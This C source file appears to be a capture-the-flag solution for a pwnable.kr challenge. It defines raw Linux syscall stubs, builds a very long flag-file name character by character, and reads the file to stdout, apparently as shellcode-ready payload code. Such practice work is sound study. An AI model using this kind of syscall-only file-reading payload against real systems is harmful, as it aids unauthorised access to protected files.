//#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <asm/unistd.h>

//#include <sys/stat.h>
//#include <fcntl.h>

#define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3)          \
  type name(type1 arg1,type2 arg2,type3 arg3)                           \
  {                                                                     \
    long __res;                                                         \
    __asm__ volatile ("int $0x80"                                       \
                      : "=a" (__res)                                    \
                      : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
                        "d" ((long)(arg3)));                            \
    return(type)__res;                                                  \
  }



__syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);
__syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
__syscall3(ssize_t, read, int, fd, void *, buf, size_t, count);


#define __syscall2(type,name,type1,arg1,type2,arg2)                     \
  type name(type1 arg1,type2 arg2)                                      \
  {                                                                     \
    long __res;                                                         \
    __asm__ volatile ("int $0x80"                                       \
                      : "=a" (__res)                                    \
                      : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2))); \
    return(type)__res;                                                  \
  }

__syscall2(int, fstat, int, fildes, struct stat * , buf);

_start(){

  char file[232];
  file[0] = 't';
  file[1] = 'h';
  file[2] = 'i';
  file[3] = 's';
  file[4] = '_';
  file[5] = 'i';
  file[6] = 's';
  file[7] = '_';
  file[8] = 'p';
  file[9] = 'w';
  file[10] = 'n';
  file[11] = 'a';
  file[12] = 'b';
  file[13] = 'l';
  file[14] = 'e';
  file[15] = '.';
  file[16] = 'k';
  file[17] = 'r';
  file[18] = '_';
  file[19] = 'f';
  file[20] = 'l';
  file[21] = 'a';
  file[22] = 'g';
  file[23] = '_';
  file[24] = 'f';
  file[25] = 'i';
  file[26] = 'l';
  file[27] = 'e';
  file[28] = '_';
  file[29] = 'p';
  file[30] = 'l';
  file[31] = 'e';
  file[32] = 'a';
  file[33] = 's';
  file[34] = 'e';
  file[35] = '_';
  file[36] = 'r';
  file[37] = 'e';
  file[38] = 'a';
  file[39] = 'd';
  file[40] = '_';
  file[41] = 't';
  file[42] = 'h';
  file[43] = 'i';
  file[44] = 's';
  file[45] = '_';
  file[46] = 'f';
  file[47] = 'i';
  file[48] = 'l';
  file[49] = 'e';
  file[50] = '.';
  file[51] = 's';
  file[52] = 'o';
  file[53] = 'r';
 file[54] = 'r';
 file[55] = 'y';
 file[56] = '_';
 file[57] = 't';
file[58] = 'h';
file[59] = 'e';
file[60] = '_';
file[61] = 'f';
file[62] = 'i';
file[63] = 'l';
file[64] = 'e';
file[65] = '_';
file[66] = 'n';
file[67] = 'a';
file[68] = 'm';
file[69] = 'e';
file[70] = '_';
file[71] = 'i';
file[72] = 's';
file[73] = '_';
file[74] = 'v';
file[75] = 'e';
file[76] = 'r';
file[77] = 'y';
file[78] = '_';
file[79] = 'l';
file[80] = 'o';
file[81] = 'o';
file[82] = 'o';
file[83] = 'o';
file[84] = 'o';
file[85] = 'o';
file[86] = 'o';
file[87] = 'o';
file[88] = 'o';
file[89] = 'o';
file[90] = 'o';
file[91] = 'o';
file[92] = 'o';
file[93] = 'o';
file[94] = 'o';
file[95] = 'o';
file[96] = 'o';
file[97] = 'o';
file[98] = 'o';
file[99] = 'o';
file[100] = 'o';
file[101] = 'o';
file[102] = 'o';
file[103] = 'o';
file[104] = 'o';
file[105] = 'o';
file[106] = 'o';
file[107] = 'o';
file[108] = 'o';
file[109] = 'o';
file[110] = 'o';
file[111] = 'o';
file[112] = 'o';
file[113] = 'o';
file[114] = 'o';
file[115] = 'o';
file[116] = 'o';
file[117] = 'o';
file[118] = 'o';
file[119] = 'o';
file[120] = 'o';
file[121] = 'o';
file[122] = 'o';
file[123] = 'o';
file[124] = 'o';
file[125] = 'o';
file[126] = 'o';
file[127] = 'o';
file[128] = 'o';
file[129] = 'o';
file[130] = 'o';
file[131] = 'o';
file[132] = 'o';
file[133] = 'o';
file[134] = 'o';
file[135] = 'o';
file[136] = 'o';
file[137] = 'o';
file[138] = 'o';
file[139] = 'o';
file[140] = 'o';
file[141] = 'o';
file[142] = 'o';
file[143] = 'o';
file[144] = 'o';
file[145] = 'o';
file[146] = 'o';
file[147] = 'o';
file[148] = 'o';
file[149] = 'o';
file[150] = 'o';
file[151] = 'o';
file[152] = 'o';
file[153] = 'o';
file[154] = 'o';
file[155] = 'o';
file[156] = '0';
file[157] = '0';
file[158] = '0';
file[159] = '0';
file[160] = '0';
file[161] = '0';
file[162] = '0';
file[163] = '0';
file[164] = '0';
file[165] = '0';
file[166] = '0';
file[167] = '0';
file[168] = '0';
file[169] = '0';
file[170] = '0';
file[171] = '0';
file[172] = '0';
file[173] = '0';
file[174] = '0';
file[175] = '0';
file[176] = '0';
file[177] = '0';
file[178] = '0';
file[179] = '0';
file[180] = '0';
file[181] = 'o';
file[182] = 'o';
file[183] = 'o';
file[184] = 'o';
file[185] = 'o';
file[186] = 'o';
file[187] = 'o';
file[188] = 'o';
file[189] = 'o';
file[190] = 'o';
file[191] = 'o';
file[192] = 'o';
file[193] = 'o';
file[194] = 'o';
file[195] = 'o';
file[196] = 'o';
file[197] = 'o';
file[198] = 'o';
file[199] = 'o';
file[200] = 'o';
file[201] = 'o';
file[202] = 'o';
file[203] = 'o';
file[204] = '0';
file[205] = '0';
file[206] = '0';
file[207] = '0';
file[208] = '0';
file[209] = '0';
file[210] = '0';
file[211] = '0';
file[212] = '0';
file[213] = '0';
file[214] = '0';
file[215] = '0';
file[216] = 'o';
file[217] = '0';
file[218] = 'o';
file[219] = '0';
file[220] = 'o';
file[221] = '0';
file[222] = 'o';
file[223] = '0';
file[224] = 'o';
file[225] = '0';
file[226] = 'o';
file[227] = '0';
file[228] = 'o';
file[229] = 'n';
 file[230] = 'g';
 file[231] = '\0';

 int fd = open(file,0000,0);
  char buf[129];
  buf[128] = '\0';
  read(fd,buf,128);
  write(1,buf,128);
  //printf("%s\n",buf);
}
